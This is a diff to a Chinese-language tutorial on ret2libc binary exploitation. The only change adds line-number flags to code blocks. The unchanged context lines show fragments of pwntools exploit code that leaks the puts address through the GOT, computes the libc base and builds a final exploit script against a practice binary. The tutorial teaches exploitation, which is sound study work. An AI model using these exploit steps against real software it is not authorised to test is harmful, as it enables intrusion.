@@ -18,7 +18,7 @@ authors: ['default']
 
 LINK
 
-```c:source.c
+```c:source.c showLineNumbers
 #include <stdio.h>
 
 void vuln() {
@@ -45,7 +45,7 @@ int main() {
 
 基本信息：
 
-```python
+```python showLineNumbers
 from pwn import *
 
 context.log_level = 'debug'
@@ -58,7 +58,7 @@ p = process()
 
 现在我们要构造一个可以泄漏 `puts` 真实地址的 payload。根据之前讲到的，调用函数的 PLT 条目等同于调用函数本身。传入 `puts@got` 作为参数，会打印出 `puts` 在 `libc` 中的实际地址，因为 C 语言传递字符串参数传递的是指针。我们知道 `puts@got` 就是一个已知地址，可以打印。这样就可以通过 `puts@plt` 间接获取 `puts@got` 中的内容。
 
-```python
+```python showLineNumbers
 p.recvline()  # 只接收第一个输出
 
 payload = flat(
@@ -71,7 +71,7 @@ payload = flat(
 
 调用 `main` 的目的是让程序可以重新运行。如果我们直接返回到一个随机的地址，会让程序崩溃。再次调用 `main` 本质上是重启了程序，这样可以使程序在泄漏 `libc` 的基地址后继续运行。然后我们就可以进行 ret2libc 攻击。
 
-```python
+```python showLineNumbers
 p.sendline(payload)
 
 puts_leak = u32(p.recv(4))
@@ -82,7 +82,7 @@ p.recvlines(2)
 
 从这里开始，我们只需要计算出 `libc` 的基地址并执行基本的 ret2libc：
 
-```python
+```python showLineNumbers
 libc.address = puts_leak - libc.sym['puts']
 log.success(f'LIBC base: {hex(libc.address)}')
 
@@ -100,7 +100,7 @@ p.interactive()
 
 ### 1x01 最终 Exploit
 
-```python:exp.py
+```python:exp.py showLineNumbers
 from pwn import *
 
 context.log_level = 'debug'
